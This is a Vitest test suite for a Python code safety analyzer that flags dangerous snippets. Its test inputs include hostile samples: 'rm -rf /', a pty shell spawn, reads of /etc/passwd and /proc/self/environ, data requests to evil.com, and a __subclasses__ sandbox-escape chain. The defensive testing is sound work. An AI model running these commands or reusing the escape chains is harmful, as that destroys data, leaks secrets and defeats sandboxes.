import { describe, it, expect } from 'vitest'
import { analyze } from '../../../core/safety'

describe('Python Safety Analyzer', () => {
  describe('dangerous imports', () => {
    it('detects os.system import', () => {
      const code = `import os\nos.system('rm -rf /')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'dangerous_import',
          message: expect.stringContaining('os'),
        })
      )
    })

    it('detects subprocess import', () => {
      const code = `import subprocess\nsubprocess.run(['ls'])`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'dangerous_import',
          message: expect.stringContaining('subprocess'),
        })
      )
    })

    it('detects socket import', () => {
      const code = `import socket\ns = socket.socket()`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'dangerous_import',
          message: expect.stringContaining('socket'),
        })
      )
    })

    it('detects pty import', () => {
      const code = `import pty\npty.spawn('/bin/bash')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'dangerous_import',
          message: expect.stringContaining('pty'),
        })
      )
    })

    it('detects from-import syntax', () => {
      const code = `from os import system\nsystem('whoami')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'dangerous_import',
        })
      )
    })
  })

  describe('code execution', () => {
    it('detects exec() calls', () => {
      const code = `exec("print('hello')")`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'code_execution',
          message: expect.stringContaining('exec'),
        })
      )
    })

    it('detects eval() calls', () => {
      const code = `result = eval("1 + 2")`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'code_execution',
          message: expect.stringContaining('eval'),
        })
      )
    })

    it('detects compile() calls', () => {
      const code = `code = compile("x = 1", "<string>", "exec")`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'code_execution',
          message: expect.stringContaining('compile'),
        })
      )
    })

    it('detects __import__() calls', () => {
      const code = `mod = __import__('os')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'code_execution',
          message: expect.stringContaining('__import__'),
        })
      )
    })
  })

  describe('file system access', () => {
    it('detects /etc/ access', () => {
      const code = `with open('/etc/passwd') as f:\n    print(f.read())`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'filesystem_access',
          message: expect.stringContaining('/etc/'),
        })
      )
    })

    it('detects /proc/ access', () => {
      const code = `open('/proc/self/environ').read()`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'filesystem_access',
          message: expect.stringContaining('/proc/'),
        })
      )
    })

    it('detects absolute path writes', () => {
      const code = `open('/tmp/malicious.sh', 'w').write('#!/bin/bash\\nrm -rf /')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'filesystem_access',
        })
      )
    })
  })

  describe('network access', () => {
    it('detects urllib.request import', () => {
      const code = `import urllib.request\nurllib.request.urlopen('http://evil.com')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'network_access',
          message: expect.stringContaining('urllib'),
        })
      )
    })

    it('detects http.client import', () => {
      const code = `import http.client\nconn = http.client.HTTPConnection('evil.com')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'network_access',
          message: expect.stringContaining('http.client'),
        })
      )
    })

    it('detects requests import', () => {
      const code = `import requests\nrequests.get('http://evil.com/steal')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'network_access',
          message: expect.stringContaining('requests'),
        })
      )
    })

    it('detects ftplib import', () => {
      const code = `from ftplib import FTP\nftp = FTP('ftp.evil.com')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'network_access',
        })
      )
    })
  })

  describe('dangerous attributes', () => {
    it('detects __builtins__ access', () => {
      const code = `__builtins__['eval']('malicious')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'dangerous_attribute',
          message: expect.stringContaining('__builtins__'),
        })
      )
    })

    it('detects __globals__ access', () => {
      const code = `func.__globals__['os'].system('whoami')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'dangerous_attribute',
          message: expect.stringContaining('__globals__'),
        })
      )
    })

    it('detects __code__ access', () => {
      const code = `func.__code__ = evil_code`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'dangerous_attribute',
          message: expect.stringContaining('__code__'),
        })
      )
    })

    it('detects __subclasses__ access', () => {
      const code = `().__class__.__bases__[0].__subclasses__()`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'dangerous_attribute',
          message: expect.stringContaining('__subclasses__'),
        })
      )
    })

    it('detects __mro__ access for class traversal', () => {
      const code = `cls.__mro__[1].__subclasses__()`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'dangerous_attribute',
        })
      )
    })
  })

  describe('pickle and marshal (arbitrary code execution)', () => {
    it('detects pickle import', () => {
      const code = `import pickle\npickle.loads(untrusted_data)`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'serialization_danger',
          message: expect.stringContaining('pickle'),
        })
      )
    })

    it('detects cPickle import', () => {
      const code = `import cPickle\ncPickle.loads(data)`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'serialization_danger',
        })
      )
    })

    it('detects marshal import', () => {
      const code = `import marshal\nmarshal.loads(code_bytes)`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'serialization_danger',
          message: expect.stringContaining('marshal'),
        })
      )
    })

    it('detects shelve import (uses pickle internally)', () => {
      const code = `import shelve\ndb = shelve.open('untrusted.db')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'serialization_danger',
        })
      )
    })
  })

  describe('ctypes and cffi (foreign function interface)', () => {
    it('detects ctypes import', () => {
      const code = `import ctypes\nctypes.CDLL('/lib/libc.so.6')`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'ffi_danger',
          message: expect.stringContaining('ctypes'),
        })
      )
    })

    it('detects cffi import', () => {
      const code = `from cffi import FFI\nffi = FFI()`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'ffi_danger',
          message: expect.stringContaining('cffi'),
        })
      )
    })
  })

  describe('infinite loops', () => {
    it('detects while True without break', () => {
      const code = `while True:\n    print("forever")`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'infinite_loop',
          message: expect.stringContaining('while True'),
        })
      )
    })

    it('detects while 1 without break', () => {
      const code = `while 1:\n    x += 1`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'infinite_loop',
        })
      )
    })

    it('allows while True with break', () => {
      const code = `while True:\n    if done:\n        break\n    process()`
      const report = analyze(code)
      // Should not flag infinite_loop when break exists
      const loopViolations = report.violations.filter(v => v.type === 'infinite_loop')
      expect(loopViolations).toHaveLength(0)
    })
  })

  describe('resource exhaustion', () => {
    it('detects massive range allocation', () => {
      const code = `data = [x for x in range(10**9)]`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'resource_exhaustion',
          message: expect.stringContaining('range'),
        })
      )
    })

    it('detects exponential expressions in range', () => {
      const code = `list(range(2**64))`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'resource_exhaustion',
        })
      )
    })

    it('detects string multiplication bombs', () => {
      const code = `bomb = "A" * (10 ** 9)`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'resource_exhaustion',
        })
      )
    })

    it('detects nested list multiplication', () => {
      const code = `matrix = [[0] * 10000] * 10000`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'resource_exhaustion',
        })
      )
    })
  })

  describe('command injection patterns', () => {
    it('detects os.popen with user input pattern', () => {
      const code = `import os\nos.popen(user_input)`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'command_injection',
        })
      )
    })

    it('detects shell=True in subprocess', () => {
      const code = `import subprocess\nsubprocess.call(cmd, shell=True)`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'command_injection',
          message: expect.stringContaining('shell=True'),
        })
      )
    })

    it('detects f-string command construction', () => {
      const code = `import os\nos.system(f"ls {user_dir}")`
      const report = analyze(code)
      expect(report.safe).toBe(false)
      expect(report.violations).toContainEqual(
        expect.objectContaining({
          type: 'command_injection',
        })
      )
    })
  })

  describe('safe code', () => {
    it('allows basic arithmetic', () => {
      const code = `result = 1 + 2 * 3`
      const report = analyze(code)
      expect(report.safe).toBe(true)
      expect(report.violations).toHaveLength(0)
    })

    it('allows list comprehensions with reasonable ranges', () => {
      const code = `squares = [x**2 for x in range(100)]`
      const report = analyze(code)
      expect(report.safe).toBe(true)
      expect(report.violations).toHaveLength(0)
    })

    it('allows function definitions', () => {
      const code = `def greet(name):\n    return f"Hello, {name}!"`
      const report = analyze(code)
      expect(report.safe).toBe(true)
      expect(report.violations).toHaveLength(0)
    })

    it('allows class definitions', () => {
      const code = `class Person:\n    def __init__(self, name):\n        self.name = name`
      const report = analyze(code)
      expect(report.safe).toBe(true)
      expect(report.violations).toHaveLength(0)
    })

    it('allows safe standard library imports', () => {
      const code = `import json\nimport math\nimport datetime`
      const report = analyze(code)
      expect(report.safe).toBe(true)
      expect(report.violations).toHaveLength(0)
    })
  })
})
